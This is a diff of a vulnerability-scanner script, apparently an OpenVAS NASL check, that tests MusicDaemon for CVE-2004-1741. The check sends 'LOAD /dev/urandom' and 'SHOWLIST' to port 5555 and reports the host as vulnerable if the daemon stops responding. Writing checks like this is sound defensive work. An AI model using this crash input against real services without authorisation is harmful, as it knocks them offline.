@@ -22,76 +22,71 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 #
 
-tag_summary = "The remote host is running MusicDaemon, a music player running as a server.
-
-It is possible to cause the Music Daemon to stop responding to 
-requests by causing it to load the /dev/random filename as its track list.
-
-An attacker can cause the product to no longer respond to requests.";
-
-tag_solution = "None at this time";
-
-# From: "cyber talon" <cyber_talon@hotmail.com>
-# Subject: MusicDaemon <= 0.0.3 Remote /etc/shadow Stealer / DoS
-# Date: 23.8.2004 17:36
-
 if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.14353");  
- script_version("$Revision: 9348 $");
- script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
- script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
- script_cve_id("CVE-2004-1741");
- script_bugtraq_id(11006);
- script_tag(name:"cvss_base", value:"5.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
+  script_oid("1.3.6.1.4.1.25623.1.0.14353");
+  script_version("2019-04-11T14:06:24+0000");
+  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
+  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
+  script_cve_id("CVE-2004-1741");
+  script_bugtraq_id(11006);
+  script_tag(name:"cvss_base", value:"5.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
+  script_name("Music Daemon Denial of Service");
+  script_category(ACT_KILL_HOST);
+  script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
+  script_family("Remote file access");
+  script_dependencies("find_service2.nasl");
+  script_require_ports("Services/musicdaemon", 5555);
 
- name = "Music Daemon Denial of Service";
- script_name(name);
- 
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
 
- 
- script_category(ACT_KILL_HOST);
+  script_tag(name:"summary", value:"It is possible to cause the Music Daemon to stop
+  responding to requests by causing it to load the /dev/random filename as its track list.");
+
+  script_tag(name:"impact", value:"An attacker can cause the product to no longer respond to requests.");
+
+  script_tag(name:"solution_type", value:"WillNotFix");
   script_tag(name:"qod_type", value:"remote_vul");
- 
- script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
- 
- family = "Remote file access";
- script_family(family);
- 
- script_dependencies("find_service2.nasl");
- script_require_ports("Services/musicdaemon", 5555);
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- exit(0);
+
+  exit(0);
 }
 
+include("misc_func.inc");
 
-port = get_kb_item("Services/musicdaemon");
-if(!port)port = 5555;
+port = get_port_for_service(default:5555, proto:"musicdaemon");
 
-if (  ! get_port_state(port) ) exit(0);
-
-# open a TCP connection
 soc = open_sock_tcp(port);
-if(!soc) exit(0);
+if(!soc)
+  exit(0);
 
-recv = recv_line(socket:soc, length: 1024);
-if ("Hello" >< recv)
-{
- data = string("LOAD /dev/urandom\r\n");
- send(socket:soc, data: data);
+recv = recv_line(socket:soc, length:1024);
+if("Hello" >< recv) {
 
- data = string("SHOWLIST\r\n");
- send(socket:soc, data: data);
+  data = string("LOAD /dev/urandom\r\n");
+  send(socket:soc, data:data);
 
- close(soc);
- sleep(5);
+  data = string("SHOWLIST\r\n");
+  send(socket:soc, data:data);
 
- soc = open_sock_tcp(port);
- if(!soc) { security_message(port:port); exit(0); }
- 
- recv = recv_line(socket:soc, length: 1024, timeout: 1);
+  close(soc);
+  sleep(5);
 
- if ("Hello" >!< recv) security_message(port:port);
+  soc = open_sock_tcp(port);
+  if(!soc) {
+    security_message(port:port);
+    exit(0);
+  }
+
+  recv = recv_line(socket:soc, length:1024, timeout:1);
+  if("Hello" >!< recv) {
+    security_message(port:port);
+    exit(0);
+  }
+  exit(99);
 }
+
+close(soc);
+exit(0);
